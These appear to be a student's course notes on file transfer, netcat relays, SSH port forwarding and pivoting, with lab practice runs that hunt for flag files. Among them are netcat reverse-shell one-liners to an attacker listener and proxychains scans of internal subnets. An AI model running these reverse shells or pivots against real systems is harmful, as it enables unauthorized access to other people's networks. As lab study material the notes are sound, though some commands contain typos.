TFTP
udp
small

ftp
tcp
authe in clear text
active 20
passive "key to specific port"

ftps
adds SSL/TLS encrypt


sftp
tcp
ftp like services on SSH

scp
tcp ssh
use through tunnels
options
  . - present working directory
  -v - verbose
  -P - alt port
  -r - recursively copies an entire directory
  -3 - 3-way copy

from remote to local
 scp student@172.16.82.106:secretstuff.txt /home/student

upload to remote from local
 scp secretstuff.txt student@172.16.82.106:/home/student

from remote to other remote
 scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student

recursive upload folder to remote
 scp -r folder/ student@172.16.82.106:

recursive download folder from remote
 scp -r student@172.16.82.106:folder/ .

download from remote directory to local directory using alt SSH port
 scp -P 1111 student@172.16.82.106:secretstuff.txt .

upload to remote directory from local directory using alt SSH port
 scp -P 1111 secretstuff.txt student@172.16.82.106:

!!!!to interact with tunnels or use tunnels!!!!!
loopback or localhost
tunnels port

SCP Syntax through a tunnel
Create a local port forward to target device
 ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Download a file from a remote directory to a local directory
 scp -P 1111 student@localhost:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory
 scp -P 1111 secretstuff.txt student@localhost:/home/student

SCP Syntax through a Dynamic Port forward
Create a Dynamic Port Forward to target device
 ssh student@172.16.82.106 -D 9050 -NT

Download a file from a remote directory to a local directory
 proxychains scp student@localhost:secretstuff.txt .

Upload a file to a remote directory from a local directory
 proxychains scp secretstuff.txt student@localhost:

Uncommon file traansfer
netcat (nc)
 client to listener 
  listener (recieve file)
  nc -lvp 9001 > newfile.txt

  client (sends file)
  nc 172.16.82.106 9001 < file.txt

 listener to client
  listener (sends file)
  nc -lvp 9001 < file.txt

  client (recieve file)
  nc 172.16.82.106 9001 > newfile.txt


NETCAT RELAYS

box 1                .1(box 1 facing int)     box 2            .2(box 3 facing int)          box 3
_________                                     ____________                                   _____________
                                              mknod mypipe p                
                                          (listener to listener)
nc -lvp 1111               nc <box1IP> 1111 < mypipe | nc <box3IP> 2222 > mypipe             nc -lvp 2222 
                                            (client to client)
nc <box2.1IP> 3333               nc -lvp 3333 < mypipe | nc -lvp 4444 > mypipe               nc <box2.2IP> 4444
                                          (listener to client)
nc -lvp 5555               nc <box1IP> 5555 < mypipe | nc -lvp 6666 > mypipe                 nc <box2.2IP> 6666





REVERSE SHELLS!!!!!!!!!!!!!!!!!!!!!
    First listen for the shell on your device.
 nc -lvp 9999

whichever works on the victim machine:
    On Victim using -c :   
 nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :
 nc -e /bin/bash 10.10.0.40 9999



---------------------SSH TUNNELING AND COVERT CHANNELS-----------------------------------
encapsulation - put inside another protocol
transmission
decapsulation

IPv6 transition
    IPv6 over IPv4
    Dual Stack
    6in4
    6to4
    4in6
    Teredo
    ISATAP


covert channel
use common protocols to transfer data in illegitamte ways
  bypasses security

storage
  payload
  header
    IP Header
    TCP Header

  timing
    modify trans of legit traffic
    delay packets
    watch ttl changes

common protocols used:
  icmp
    1 req , 1 answer
      payload imbalance
      req/resp imbalance
      large payload in resp
    
  dns
    1 req , 1 answer (typically, zonetransfer can be larger)
      payload usually < 512 bytes
        req/resp imbalance
        unusual payloads
      burstiness or continous use

  http
    req/resp
    "bursty" but not continous/steady
      should not be 2G 

Host Analysis
      Requires knowledge of each applications expected behavior.
Network Analysis
      A good understanding of your network and the common network protocols being used is the key
Baselining of what is normal to detect what is abnormal




---SSH-----
options
  -L - Creates a port on the client mapped to a ip:port via the server
  -D - Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically
  -R - Creates the port on the server mapped to a ip:port via the client
  -NT - Do not execute a remote command and disable pseudo-tty (will hang window)
  -p specifies a port

defualts for SSH
  port
  user

Local port forwarding 
  ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
  ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT

Local Port Forward to localhost of server

1  Internet_Host:
  ssh student@172.16.1.15 -L 1123:loopback:23
  or
  ssh -L 1123:loopback:23 student@172.16.1.15

1  Internet_Host:
  telnet loopback 1123
  Blue_DMZ_Host-1~$

2  Internet_Host:
  ssh student@172.16.1.15 -L 1180:loopback:80
  or
  ssh -L 1180:loopback:80 student@172.16.1.15

2  Internet_Host:
  firefox http://loopback:1180
  {Webpage of Blue_DMZ_Host-1}

Local Port Forward to remote target via server
!!!!!!!!!!(use the -NT option)!!!!!!!!!!!

1  Internet_Host:
  ssh student@172.16.1.15 -L 2222:172.16.40.10:22
  or
  ssh -L 2222:172.16.40.10:22 student@172.16.1.15

1  Internet_Host:
  ssh student@loopback -p 2222
  Blue_INT_DMZ_Host-1~$

2  Internet_Host:
  ssh student@172.16.1.15 -L 2223:172.16.40.10:23
  or
  ssh -L 2223:172.16.40.10:23 student@172.16.1.15

2  Internet_Host:
  telnet loopback 2223
  Blue_INT_DMZ_Host-1~$

3  Internet_Host:
  ssh student@172.16.1.15 -L 2280:172.16.40.10:80
  or
  ssh -L 2280:172.16.40.10:80 student@172.16.1.15

3  Internet_Host:
  firefox http://loopback:2280
  {Webpage of Blue_INT_DMZ_Host-1}

Forward through Tunnel
1  Internet_Host:
  ssh student@172.16.1.15 -L 2222:172.16.40.10:22
  ssh student@loopback -p 2222 -L 3322:172.16.82.106:22

1  Internet_Host:
  ssh student@loopback -p 3322
  Blue_Host-1~$

2  Internet_Host:
  ssh student@172.16.1.15 -L 2222:172.16.40.10:22
  ssh student@loopback -p 2222 -L 3323:172.16.82.106:23

2  Internet_Host:
  telnet loopback 3323
  Blue_Host-1~$

3  Internet_Host:
ssh student@172.16.1.15 -L 2222:172.16.40.10:22
ssh student@loopback -p 2222 -L 3380:172.16.82.106:80

3  Internet_Host:
  firefox http://loopback:3380
  {Webpage of Blue_Host-1}

Dynamic Port Forwarding
  ssh <user>@<server ip> -p <alt port> -D <port> -NT
  or
  ssh -D <port> -p <alt port> <user>@<server ip> -NT

  Proxychains default port is 9050
  Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
  Allows the use of scripts and other userspace programs through the tunnel.

   Internet_Host:
  ssh student@172.16.1.15 -D 9050
  or
  ssh -D 9050 student@172.16.1.15
!!imagine you have attatched a 100 mile long ethernet from our NIC to the jump box, the jump box is now routing our network traffic,
!!we can now use all or most of our tools to scan ports, networks, boxes, etc.
!!can only use 1 DYNAMIC SSH

   Internet_Host:
  proxychains ./scan.sh
  proxychains nmap -Pn 172.16.40.0/27 -p 21-23,80
  proxychains ssh student@172.16.40.10
  proxychains telnet 172.16.40.10
  proxychains wget -r http://172.16.40.10
  proxychains wget -r ftp://172.16.40.10

SSH Dynamic Port Forwarding 2-Step
1  Internet_Host:
  ssh student@172.16.1.15 -L 2222:172.16.40.10:22
  or
  ssh -L 2222:172.16.40.10:22 student@172.16.1.15

1  Internet_Host:
  ssh student@loopback -p 2222 -D 9050
  or
  ssh -D 9050 student@loopback -p 2222

SSH Dynamic Port Forwarding 2-Step
  Internet_Host:
  proxychains ./scan.sh
  proxychains nmap -Pn 172.16.82.96/27 -p 21-23,80
  proxychains ssh student@172.16.82.106
  proxychains telnet 172.16.82.106
  proxychains wget -r http://172.16.82.106
  proxychains wget -r ftp://172.16.82.106

Remote Port Forwarding
  ssh -p <optional alt port> <user>@<server ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
  or
  ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT

Remote Port Forwarding from localhost of client
(in class)used to give us access to SSH on another box if we cant access it normally
remote port command is run on NOT our box

1  Blue_DMZ_Host-1:
  ssh student@10.10.0.40 -R 4422:loopback:22
  or
  ssh -R 4422:loopback:22 student@10.10.0.40

1  Internet_Host:
  ssh student@loopback -p 4422
  Blue_DMZ_Host-1~$

2  Blue_DMZ_Host-1:
  ssh student@10.10.0.40 -R 4480:loopback:80
  or
  ssh -R 4480:loopback:80 student@10.10.0.40

2  Internet_Host:
  firefox http://loopback:4480
  {Webpage of Blue_DMZ_Host-1}

remote like EMERGENCY DOOR, can be opened from the inside but not normally from the outside, need someone/something to hold the door open for us
get on box
ss -antp
see what ports it has running that werent scanned externally
open the door for our IP to connect 

Remote Port Forwarding to remote target via client
Blue_DMZ_Host-1:
ssh student@10.10.0.40 -R 5522:172.16.40.10:22
or
ssh -R 5522:172.16.40.10:22 student@10.10.0.40

Internet_Host:
ssh student@loopback -p 5522
Blue_INT_DMZ_Host-1~$

Bridging Local and Remote Port Forwarding

-Internet_Host:
  ssh student@172.16.1.15 -L 2223:172.16.40.10:23 -NT
  or
  ssh -L 2223:172.16.40.10:23 student@172.16.1.15 -NT

-Internet_Host:
  telnet loopback 2223
  Blue_INT_DMZ_Host-1~$

-Blue_INT_DMZ_Host-1:
  ssh student@172.16.1.15 -R 1122:loopback:22
  or
  ssh -R 1122:loopback:22 student@172.16.1.15 

-Internet_Host:
  ssh student@172.16.1.15 -L 2222:loopback:1122
  or
  ssh -L 2222:loopback:1122 student@172.16.1.15

-Internet_Host:
  ssh student@loopback -p 2222 -D 9050
  or
  ssh -D 9050 student@loopback -p 2222

-Internet_Host:
  proxychains ./scan.sh
  proxychains nmap -Pn -sT 172.16.82.96/27 -p 21-23,80
  proxychains ssh student@172.16.82.106
  proxychains telnet 172.16.82.106
  proxychains wget -r http://172.16.82.106
  proxychains wget -r ftp://172.16.82.106

if a float is used to access a box, float is needed to pass back from the connected device

------------------------tunneling practice

IH@ ssh student@10.50.33.99 -D 9050 -NT
find ip, hostname, etc. 
find what ips are available to who (0.0.0.0 - available to everyone, netid - have to be on local net)
ss -ntlp
find network info
IH@ proxychains nmap 192.168.1.32/27 -Pn -T4 -p 21-23,80
.39 found
IH@ [[reuse dynamic make it local]] ssh student@10.50.33.99 -L 12345:192.168.1.39:22 -NT
IH@ ssh student@127.0.0.1 -p 12345 -D 9050 [[creds will be for the .39]]
find ip, hostname, etc. 
find what ips are available to who (0.0.0.0 - available to everyone, netid - have to be on local net)
ss -ntlp
find network info
IH@ proxychains ./scan.sh
IH@ [[reuse dynamic make it local]] ssh student@127.0.0.1 -p 12345 -L 23456:10.0.0.50:22
IH@ ssh student@127.0.0.1 -p 23456 [check connection, then add] -D 9050 [[creds will be for the .50]]
find ip, hostname, etc. 
find what ips are available to who (0.0.0.0 - available to everyone, netid - have to be on local net)
ss -ntlp
find network info
IH@ [[reuse dynamic make it local]] ssh student@127.0.0.1 -p 23456 -L 34567:172.16.1.8:22
IH@ ssh student@127.0.0.1 -p 34567 [check connection, then add] -D 9050 [[creds will be for the .8]]
IH@ proxychains .....
find ip, hostname, etc. 
find what ips are available to who (0.0.0.0 - available to everyone, netid - have to be on local net)
ss -ntlp
find network info

NMap -if you see all filtered for a network, you dont have access to that box, check to make sure your tunnels are setup correctly
tunnel terminal naming
TUNNEL <PORT> -> <NAME OR IP OF TARGET>

!!!!!!!LOOK AT DYNAMIC TO MAKE SURE IT WORKED, bind[[127.0.0.1]]:9050: Address already in use MEANS IT FAILED!!!!!!!!!!!!!!!!!!

----------------------tunneling practice 2
IH@ telnet 10.50.29.19 [creds]
!!!HA@ ssh student@10.50.23.21 -R 11711:127.0.0.1:22 -NT
IH@ ssh student@127.0.0.1 -p 11711 [check connection, then add] -D 9050 -NT
find ip, hostname, etc. 
ss -ntlp
find / -iname <hint*/flag*> 2>/dev/null
find netowrk info (10.1.2.18)
IH@ ssh student@127.0.01 -p 11711 -L 11722:10.1.2.18:2222 -NT
IH@ ssh student@127.0.0.1 -p 11722 [check connection, then add] -D 9050 -NT
find ip, hostname, etc. 
ss -ntlp
find / -iname <hint*/flag*> 2>/dev/null
find netowrk info (172.16.10.121)
IH@ ssh student@127.0.0.1 -p 11722 -L 11733:172.16.10.121:2323 -NT
IH@ ssh student@127.0.0.1 -p 11733 [check connection, then add] -D 9050 -NT
find ip, hostname, etc. 
ss -ntlp
find / -iname <hint*/flag*> 2>/dev/null
find netowrk info (192.168.10.69)
IH@ ssh student@127.0.0.1 -p 11733 -L 11744:192.168.10.69:22 -NT
IH@ ssh student@127.0.0.1 -p 11744 [check connection, then add] -D 9050 -NT
find ip, hostname, etc. 
ss -ntlp
find / -iname <hint*/flag*> 2>/dev/null

-----------tunneling practice 3
IH@ssh student@10.50.29.89 -p 1234 -D 9050 -NT

IH@ssh student@10.50.29.89 -p 1234 -L 11711:172.17.17.28:23 -NT
IH@ telnet 127.0.0.1 11711
HB@ ssh student@172.17.17.17 -p 1234 -R 11722:127.0.0.1:4321 - NT
IH@ ssh student@10.50.29.89 -p 1234 -L 11733:127.0.0.1:11722 -NT
IH@ ssh student@127.0.0.1 -p 11733 -D 9050 -NT


--------------------tunneling practice 4
IH@ telnet 10.50.22.42
HA@ ssh student@10.50.20.51 -R 11711:127.0.0.1:8462 -NT
IH@ ssh student@127.0.0.1 -p 11711 -D 9050 -NT 
IH@ ssh student@127.0.0.1 -p 11711 -L 11722:192.168.100.60:22
IH@ ssh student@127.0.0.1 -p 11722 -D 9050 -NT 
IH@ ssh student@127.0.0.1 -p 11722 -L 11733:10.90.50.140:6481
IH@ ssh student@127.0.0.1 -p 11733 -D 9050 -NT
IH@ ssh student@127.0.0.1 -p -L 11766:172.20.21.5:23
IH@ telnet 127.0.0.1 11766
HD@ ssh student@172.20.21.4 -R 11744:127.0.0.1:22
IH@ ssh student@127.0.0.1 -p 11733 -L 11755:127.0.0.1:11744
IH@ ssh student@127.0.0.1 -p 11755 -D 9050 -NT
